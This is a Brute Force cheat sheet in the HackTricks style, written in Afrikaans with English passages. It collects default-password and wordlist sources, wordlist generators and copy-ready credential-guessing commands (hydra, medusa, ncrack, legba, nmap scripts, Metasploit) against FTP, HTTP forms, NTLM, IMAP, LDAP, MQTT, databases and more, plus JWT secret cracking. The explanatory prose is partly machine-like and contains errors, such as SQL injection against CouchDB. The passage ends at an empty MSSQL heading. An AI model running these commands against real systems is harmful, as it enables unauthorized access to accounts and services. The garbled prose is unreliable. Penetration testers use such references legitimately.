# Brute Force - Spiekbrief

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik en outomaties werkstrome te bou met behulp van die wêreld se mees gevorderde gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Standaardlegitimasie

**Soek in Google** vir standaardlegitimasie van die tegnologie wat gebruik word, of **probeer hierdie skakels**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Skep jou eie Woordeboeke**

Vind soveel moontlike inligting oor die teiken en genereer 'n aangepaste woordeboek. Hulpmiddels wat kan help:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is 'n hulpmiddel wat gebruik word om woordlyste te skep deur webwerwe te skandeer vir sleutelwoorde. Dit kan gebruik word vir aanvalle soos brute force en woordeboekaanvalle. Cewl kan ook gebruik word om sosiale media-profiels te analiseer en inligting te versamel oor 'n teiken persoon. Dit is 'n kragtige hulpmiddel vir inligtingversameling en kan 'n waardevolle bron wees vir 'n hacker.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genereer wagwoorde gebaseer op jou kennis van die slagoffer (name, datums...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

'n Woordelys-generator-hulpmiddel wat jou in staat stel om 'n stel woorde te voorsien, wat jou die moontlikheid gee om verskeie variasies van die gegee woorde te skep, en sodoende 'n unieke en ideale woordelys te skep om te gebruik met betrekking tot 'n spesifieke teiken.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Woordlyste

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) om maklik **werkstrome** te bou en outomatiseer met behulp van die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry vandag toegang:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Dienste

Alfabeties gerangskik volgens diensnaam.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a protocol used by Apache Tomcat to communicate with web servers. It is similar to the HTTP protocol but is more efficient for communication between the web server and the application server.

AJP can be vulnerable to brute force attacks, where an attacker attempts to guess the correct username and password combination to gain unauthorized access to the application server. Brute force attacks can be performed using automated tools that systematically try different combinations until the correct one is found.

To protect against AJP brute force attacks, it is important to implement strong authentication mechanisms, such as using complex passwords and enforcing account lockouts after a certain number of failed login attempts. Additionally, monitoring and logging failed login attempts can help detect and respond to brute force attacks in a timely manner.

It is also recommended to regularly update and patch the software used for AJP communication to ensure any known vulnerabilities are addressed. Regular security assessments and penetration testing can help identify and mitigate any potential weaknesses in the AJP implementation.

By following these best practices, organizations can reduce the risk of AJP brute force attacks and ensure the security of their application servers.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM en Solace)

AMQP (Advanced Message Queuing Protocol) is 'n protokol wat gebruik word vir die uitruil van boodskappe tussen toepassings. Dit word dikwels gebruik in boodskapverspreidingsstelsels soos ActiveMQ, RabbitMQ, Qpid, JORAM en Solace. Hierdie platforms maak gebruik van AMQP om boodskappe te stuur en te ontvang.

### Brute Force-aanvalle op AMQP

'n Brute Force-aanval op AMQP behels die poging om die regte gebruikersnaam en wagwoordkombinasie te raai om toegang tot die AMQP-stelsel te verkry. Hier is 'n paar metodes wat gebruik kan word om 'n brute force-aanval op AMQP uit te voer:

1. Woordelys-aanval: Hierdie metode behels die gebruik van 'n woordelys van algemene gebruikersname en wagwoordkombinasies om toegang te probeer verkry. Dit kan gedoen word met behulp van gereedskap soos Hydra of Medusa.

2. Brute Force-aanval met aangepaste kombinasies: Hierdie metode behels die gebruik van 'n gereedskap soos Hydra of Medusa om aangepaste kombinasies van gebruikersname en wagwoorde te probeer. Dit kan nuttig wees as die standaard kombinasies nie suksesvol is nie.

3. Woordeboek-aanval met aanpassings: Hierdie metode behels die gebruik van 'n woordelys van algemene woorde en die aanpassing van die woorde deur byvoorbeeld hoofletters, syfers of spesiale karakters by te voeg. Dit kan gedoen word met behulp van gereedskap soos John the Ripper of Hashcat.

Dit is belangrik om te onthou dat brute force-aanvalle tydrowend kan wees en dat dit 'n groot hoeveelheid rekenaarhulpbronne kan vereis. Dit is ook belangrik om etiese hackingpraktyke te volg en slegs toestemming te verkry om 'n brute force-aanval uit te voer op 'n stelsel waarvoor jy bevoegd is om dit te doen.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra is 'n gedistribeerde databasisstelsel wat ontwerp is om hoë beskikbaarheid en skaalbaarheid te bied vir groot hoeveelhede data. Dit is 'n NoSQL-databasis wat gebruik maak van 'n kolomgebaseerde model om data te stoor. Dit is bekend vir sy vermoë om groot hoeveelhede data te hanteer en hoë lees- en skryfvermoëns te bied.

#### Brute Force-aanvalle op Cassandra

Brute force-aanvalle is 'n metode wat gebruik word om toegang te verkry tot 'n stelsel deur alle moontlike kombinasies van gebruikersname en wagwoorde te probeer. Hier is 'n paar bruto kragte tegnieke wat gebruik kan word om 'n Cassandra-databasis aan te val:

1. **Woordelys-aanval**: Hierdie metode behels die gebruik van 'n woordelys van algemene wagwoorde om toegang te verkry tot 'n Cassandra-databasis. Dit is belangrik om 'n uitgebreide woordelys te hê wat verskillende kombinasies van woorde, frases en getalle bevat.

2. **Brute Force-aanval met aangepaste kombinasies**: Hierdie metode behels die gebruik van 'n program of skripsie om alle moontlike kombinasies van karakters vir gebruikersname en wagwoorde te genereer en te probeer. Dit kan 'n tydrowende proses wees, veral as die wagwoordlengte lank is.

3. **Rainbow-tafelaanval**: Hierdie metode behels die gebruik van 'n vooraf berekende tafel met wagwoorde en hul ooreenstemmende hashowaardes om toegang te verkry tot 'n Cassandra-databasis. Dit kan 'n effektiewe metode wees as die oorspronklike wagwoorde nie sterk gehash is nie.

Dit is belangrik om te verseker dat sterk wagwoorde gebruik word en dat die nodige veiligheidsmaatreëls geïmplementeer word om brute force-aanvalle op Cassandra te voorkom.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB is 'n NoSQL databasis wat gebruik maak van 'n dokument-georiënteerde benadering. Dit is bekend vir sy veelsydigheid en skalerbaarheid. Hier is 'n paar brutaal kragtegnieke wat jy kan gebruik om toegang tot 'n CouchDB-databasis te verkry:

#### 1. Standaard wagwoorde

Baie gebruikers stel nie hul eie wagwoorde in vir hul CouchDB-databasisse nie. Dit beteken dat jy dalk toegang kan verkry deur die standaard wagwoord te gebruik. Dit is belangrik om te onthou dat dit slegs werk as die gebruiker nie 'n wagwoord ingestel het nie.

#### 2. Woordelys-aanvalle

'n Woordelys-aanval behels die gebruik van 'n lys algemene wagwoorde en kombinasies om toegang te verkry. Jy kan 'n woordelys van algemene wagwoorde vind en dit gebruik om te probeer om in te breek in die CouchDB-databasis.

#### 3. Brute krag-aanvalle

'n Brute krag-aanval behels die outomatiese poging om alle moontlike kombinasies van karakters te probeer totdat die regte wagwoord gevind word. Dit kan 'n tydrowende proses wees, maar dit kan suksesvol wees as die wagwoord nie sterk genoeg is nie.

#### 4. SQL-injeksie

As die CouchDB-databasis gebruik maak van 'n SQL-databasisagterkant, kan jy dalk 'n SQL-injeksie-aanval uitvoer om toegang te verkry. Hierdie aanval behels die invoeging van kwaadwillige SQL-kode in 'n invoerveld om die databasis te manipuleer.

#### 5. Databasislekke

Dit is belangrik om te kyk vir enige databasislekke wat dalk beskikbaar is op die internet. Jy kan soek na gelekte databasisse wat wagwoorde bevat wat ook in die CouchDB-databasis gebruik kan word.

Onthou, dit is belangrik om etiese hackingpraktyke te volg en slegs toestemming te verkry om toegang tot 'n CouchDB-databasis te verkry.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Register

'n Docker Register is 'n stelsel wat gebruik word om Docker-beelde te stoor en te bestuur. Dit is 'n sentrale plek waar Docker-beelde geplaas en gedeel kan word. Dit is 'n nuttige hulpmiddel vir ontwikkelaars en operasionele spanne om Docker-beelde te organiseer en te bestuur.

'n Docker Register kan as 'n openbare register of 'n private register ingestel word. 'n Openbare register is toeganklik vir enigeen en word dikwels gebruik om openbare beelde te deel. 'n Privaat register is beperk tot 'n spesifieke organisasie of groep en word gebruik om privaat beelde binne die organisasie te stoor en te deel.

'n Docker Register kan ook sekuriteitstoegangsbeheer implementeer om te verseker dat slegs geakkrediteerde gebruikers toegang tot die beelde het. Dit kan ook funksies bied soos beeldversiesbeheer, beeldsleutelwoorde en beeldmetadata.

Die mees algemene Docker Register is die Docker Hub, wat 'n openbare register is wat deur Docker self bedryf word. Daar is egter ook ander opsies beskikbaar, soos die gebruik van 'n private register soos die Google Container Registry of die opstel van 'n eie private register met behulp van sagteware soos Docker Registry of Harbor.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch is 'n oopbron, gedistribueerde soekenjin wat gebruik maak van Apache Lucene om vinnige en skaalbare soektogte na gestruktureerde en ongestruktureerde data te bied. Dit is 'n baie gewilde keuse vir die indeksering en soektog van groot hoeveelhede data, soos loglêers, metodes, dokumente en meer. Elasticsearch bied 'n kragtige soektaal en 'n ryk stel funksies wat dit 'n waardevolle hulpmiddel maak vir die hantering van data-analise en soektogte in 'n verskeidenheid toepassings.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) is 'n protokol wat gebruik word vir die oordrag van lêers tussen rekenaars op 'n netwerk. Dit is 'n algemene metode vir die oordrag van lêers tussen 'n kliënt en 'n bediener. FTP maak gebruik van 'n gebruikersnaam en wagwoord vir verifikasie en maak gebruik van 'n reeks opdragte om die oordrag van lêers te beheer.

#### Brute Force-aanval op FTP

'n Brute Force-aanval op FTP is 'n metode waar 'n aanvaller probeer om toegang tot 'n FTP-bedieners te verkry deur verskeie kombinasies van gebruikersname en wagwoorde te probeer. Die aanvaller gebruik 'n program of skripsie om outomaties die kombinasies te probeer totdat die regte kombinasie gevind word.

Hier is 'n paar metodes wat gebruik kan word om 'n brute force-aanval op FTP uit te voer:

1. Woordelys-aanval: Hierdie metode behels die gebruik van 'n woordelys van algemene wagwoorde om te probeer om toegang tot die FTP-bedieners te verkry. Die aanvaller gebruik 'n program of skripsie om elke wagwoord in die woordelys te probeer totdat die regte wagwoord gevind word.

2. Brute Force-aanval met behulp van 'n woordelys en regels: Hierdie metode behels die gebruik van 'n woordelys van wagwoorde, sowel as spesifieke reëls om die wagwoorde te verander. Byvoorbeeld, die aanvaller kan reëls soos die vervanging van letters met syfers of die toevoeging van spesiale karakters gebruik. Hierdie metode verhoog die aantal moontlike kombinasies wat probeer word.

3. Brute Force-aanval met behulp van 'n aangepaste woordelys: Hierdie metode behels die gebruik van 'n aangepaste woordelys wat spesifiek is vir die teiken. Die aanvaller kan inligting soos gebruikersname, e-posadressse of enige ander relevante inligting insluit om die wagwoorde te raai.

Dit is belangrik om te onthou dat 'n brute force-aanval op FTP 'n tydrowende proses kan wees, veral as die wagwoord sterk en lang is. Dit is ook belangrik om sterk wagwoorde te gebruik en om sekuriteitsmaatreëls soos tweeledige verifikasie te implementeer om die risiko van 'n suksesvolle brute force-aanval te verminder.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### HTTP Generiese Brute

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP Basiese Auth
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM (New Technology LAN Manager) is an authentication protocol used in Windows environments. It is commonly used for HTTP authentication, allowing users to access web applications and services.

#### Brute-Forcing NTLM Credentials

To perform a brute-force attack on NTLM credentials, you can use tools like `Medusa` or `Hydra`. These tools allow you to automate the process of trying different username and password combinations until a valid set of credentials is found.

Here is an example command using `Medusa` to brute-force NTLM credentials:

```plaintext
medusa -h <target_ip> -u <username_list> -P <password_list> -M http -m AUTH:NTLM -T 10
```

- `<target_ip>`: The IP address of the target machine.
- `<username_list>`: A file containing a list of usernames to try.
- `<password_list>`: A file containing a list of passwords to try.
- `-M http`: Specifies the protocol to use (HTTP).
- `-m AUTH:NTLM`: Specifies the authentication method to use (NTLM).
- `-T 10`: Specifies the number of threads to use (10 in this example).

#### Protecting Against Brute-Force Attacks

To protect against brute-force attacks on NTLM credentials, you can implement the following measures:

1. Enforce strong password policies: Require users to choose complex passwords that include a combination of uppercase and lowercase letters, numbers, and special characters. Additionally, enforce password expiration and prevent password reuse.

2. Implement account lockout policies: Set up account lockout thresholds to temporarily lock user accounts after a certain number of failed login attempts. This can help prevent brute-force attacks by slowing down the attacker's progress.

3. Monitor and analyze logs: Regularly review logs for any suspicious activity, such as multiple failed login attempts from the same IP address. This can help identify and mitigate brute-force attacks in real-time.

By implementing these measures, you can significantly reduce the risk of successful brute-force attacks on NTLM credentials.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Pos Vorm

Brute force is 'n aanvalstegniek wat gebruik word om toegang te verkry tot 'n stelsel deur herhaaldelik verskillende wagwoorde of gebruikersname te probeer. Hierdie tegniek kan gebruik word om toegang te verkry tot 'n webwerf wat 'n posvorm gebruik om inligting te verifieer.

Die eerste stap in 'n brute force-aanval op 'n HTTP-posvorm is om die HTTP-aanvraag te analiseer wat deur die vorm gestuur word. Die aanvraag sal 'n spesifieke URL hê, gewoonlik die URL van die posvorm self. Dit sal ook 'n spesifieke metode hê, gewoonlik 'POST', wat aandui dat die vormdata gestuur moet word.

Die volgende stap is om 'n lys van moontlike wagwoorde of gebruikersname te genereer. Hierdie lys kan bestaan uit algemene wagwoorde, woordelyswoorde of selfs persoonlike inligting oor die teiken. Dit is belangrik om 'n lys te hê wat so volledig as moontlik is, aangesien die sukses van die brute force-aanval afhang van die korrek raai van die regte wagwoord of gebruikersnaam.

Die brute force-aanvaller sal dan elke wagwoord-gebruikersnaam-kombinasie van die lys probeer deur dit in die posvormdata in te voer en die HTTP-aanvraag te stuur. As die wagwoord-gebruikersnaam-kombinasie korrek is, sal die webwerf 'n suksesvolle verifikasie terugstuur, wat aandui dat die toegang verkry is. As die kombinasie ongeldig is, sal die webwerf 'n foutboodskap of 'n onsuksesvolle verifikasie terugstuur.

Die brute force-aanval kan voortgaan totdat die regte wagwoord-gebruikersnaam-kombinasie gevind is, of totdat 'n bepaalde tydlimiet bereik is. Dit is belangrik om op te let dat brute force-aanvalle tydrowend kan wees en dat dit 'n groot hoeveelheid pogings kan neem voordat die regte kombinasie gevind word.

Daar is verskeie tegnieke en hulpmiddels beskikbaar om brute force-aanvalle uit te voer. Dit sluit in outomatiese hulpmiddels wat wagwoorde en gebruikersname outomaties probeer, en hulpmiddels wat spesifiek ontwerp is vir die aanval van HTTP-posvorme.

Dit is belangrik om te onthou dat brute force-aanvalle onwettig is en dat dit slegs gebruik moet word met toestemming van die eienaar van die teikenstelsel.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Vir http**s** moet jy verander van "http-post-form" na "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla of (D)rupal of (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) is 'n protokol wat gebruik word om e-posboodskappe te ontvang en te stoor op 'n e-posbediener. Dit maak dit moontlik vir gebruikers om toegang tot hul e-posrekeninge te verkry en e-posboodskappe te lees vanaf enige toestel wat met die internet verbind is.

IMAP ondersteun verskillende funksies, soos die sien van 'n lys van e-posboodskappe in 'n posbus, die lees van e-posboodskappe, die stuur van nuwe e-posboodskappe, die uitvee van e-posboodskappe en die skep van nuwe posbusse. Dit maak ook gebruik van 'n stelsel van mappen om e-posboodskappe te organiseer en te kategoriseer.

'N Brute force-aanval op 'n IMAP-bediener behels die gebruik van 'n program of skripsie om verskeie kombinasies van gebruikersname en wagwoorde te probeer om toegang tot 'n e-posrekening te verkry. Hierdie aanvalsmetode kan gebruik word om swak wagwoorde te identifiseer en toegang tot 'n rekening te verkry sonder die korrekte legitimasie.

Dit is belangrik om sterk wagwoorde te gebruik en tweestapsverifikasie in te stel om die risiko van 'n suksesvolle brute force-aanval te verminder.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
IRC (Internet Relay Chat) is 'n kommunikasieprotokol wat gebruik word vir real-time gesprekke oor die internet. Dit maak gebruik van 'n klient-bedieners model, waar gebruikers 'n IRC-klient gebruik om met 'n IRC-bediener te verbind. IRC-kanale word gebruik om gesprekke te organiseer en te fasiliteer, en gebruikers kan boodskappe stuur en ontvang binne hierdie kanale. IRC word dikwels gebruik vir gemeenskapsgebaseerde gesprekke, soos in openbare IRC-kanale of in privaatgroepgesprekke.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI (Internet Small Computer System Interface) is 'n protokol wat gebruik word om SCSI-opdragte oor 'n IP-netwerk te stuur. Dit maak dit moontlik om 'n blokgebaseerde toegang tot stoorplek oor 'n netwerk te verkry. iSCSI maak gebruik van TCP/IP-protokolle om SCSI-opdragte te verpak en oor te dra oor 'n IP-netwerk. Dit bied 'n koste-effektiewe en maklik implementeerbare oplossing vir die koppel van stoorplekbronne oor lang afstande.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JWT (JSON Web Tokens) is 'n openbare standaard (RFC 7519) wat gebruik word vir die veilige oordrag van inligting tussen partye as 'n JSON-voorwerp. Dit word dikwels gebruik vir die verifikasie en outentisering van gebruikers in webtoepassings en API's.

'n JWT bestaan uit drie dele: 'n header, 'n payload en 'n handtekening. Die header bevat inligting oor die tipe token en die gebruikte algoritme. Die payload bevat die nuttige inligting wat oorgedra word, soos gebruikersinligting of toegangsregte. Die handtekening word gebruik om die integriteit van die token te verseker en te verseker dat dit nie gewysig is nie.

Brute force-aanvalle kan gebruik word om die geheime sleutel te agterhaal wat gebruik word om die JWT te onderteken. Dit behels die outomatiese poging van verskillende moontlike sleutels totdat die regte een gevind word. Hierdie aanval kan tydrowend wees, veral as die sleutel sterk en lang is.

Om te voorkom dat JWT's deur brute force-aanvalle gekraak word, is dit belangrik om sterk en unieke sleutels te gebruik. Dit kan ook nuttig wees om maatreëls te implementeer soos beperkte pogings, waar die toepassing na 'n sekere aantal mislukte pogings tydelik blokkeer.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) is 'n protokol wat gebruik word om toegang te verkry tot en te kommunikeer met 'n directory-diens. Dit word dikwels gebruik in netwerke om gebruikersinligting en -hulpbronne te organiseer en te versprei. LDAP-bruteforcing is 'n tegniek wat gebruik word om toegang te verkry tot 'n LDAP-diens deur verskeie gebruikersname en wagwoorde te probeer totdat 'n geldige kombinasie gevind word. Hierdie tegniek kan gebruik word om swakke wagwoordbeleide te identifiseer en om toegang te verkry tot beskermde hulpbronne.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) is 'n ligewig, eenvoudige en betroubare protokol wat gebruik word vir die uitruil van boodskappe tussen toestelle. Dit is ontwerp vir die effektiewe kommunikasie tussen toestelle in 'n netwerk met beperkte hulpbronne, soos sensore en aktuators in die Internet of Things (IoT)-omgewing.

MQTT maak gebruik van 'n publish-subscribe-model, waar toestelle boodskappe kan publiseer en inteken op spesifieke onderwerpe. Die protokol maak gebruik van 'n TCP/IP-verbinding en maak gebruik van minimale bandwydte en hulpbronverbruik. Dit maak dit ideaal vir toepassings waar energiebesparing en netwerkbeperkings belangrik is.

Die veiligheid van MQTT kan verbeter word deur gebruik te maak van versleuteling en outentisering. Dit kan ook blootstelling aan aanvalle soos brute krag-aanvalle voorkom. Brute krag-aanvalle is 'n tegniek waar 'n aanvaller probeer om toegang te verkry tot 'n stelsel deur alle moontlike kombinasies van wagwoorde of sleutels te probeer.

Om 'n brute krag-aanval teen MQTT te voorkom, kan maatreëls soos die gebruik van sterk wagwoorde, die beperking van die aantal foute pogings en die gebruik van outentiseringsmetodes soos TLS/SSL geïmplementeer word. Dit is ook belangrik om die MQTT-bediener op te dateer met die nuutste veiligheidsopdaterings om bekende kwesbaarhede te voorkom.

As 'n hacker is dit belangrik om bewus te wees van die moontlikheid van brute krag-aanvalle teen MQTT en om sekuriteitsmaatreëls te implementeer om die risiko te verminder.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

#### Brute Force

Brute force is a common technique used to gain unauthorized access to a MongoDB database. It involves systematically trying all possible combinations of usernames and passwords until the correct credentials are found.

To perform a brute force attack on a MongoDB database, you can use tools like Hydra or Medusa. These tools allow you to automate the process of trying different combinations of usernames and passwords.

Before attempting a brute force attack, it is important to gather information about the target MongoDB database. This includes identifying the MongoDB version, the authentication mechanism used, and any default usernames or passwords that may be present.

Once you have gathered this information, you can start the brute force attack by specifying the target MongoDB server, the list of usernames to try, and the list of passwords to try. The tool will then systematically try each combination until it finds the correct credentials.

To increase the chances of success, it is recommended to use a large wordlist for usernames and passwords. These wordlists can be obtained from various sources, such as leaked databases or password cracking forums.

It is important to note that brute forcing a MongoDB database is illegal and unethical unless you have explicit permission from the owner to perform the attack. Always ensure that you are conducting any hacking activities within the boundaries of the law and with proper authorization.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

MSSQL, of Microsoft SQL Server, is 'n relationele databasisbestuurstelsel wat deur Microsoft ontwikkel is. Dit word algemeen gebruik vir die stoor en bestuur van data in besigheidsomgewings. 

#### Brute Force-aanvalle teen MSSQL

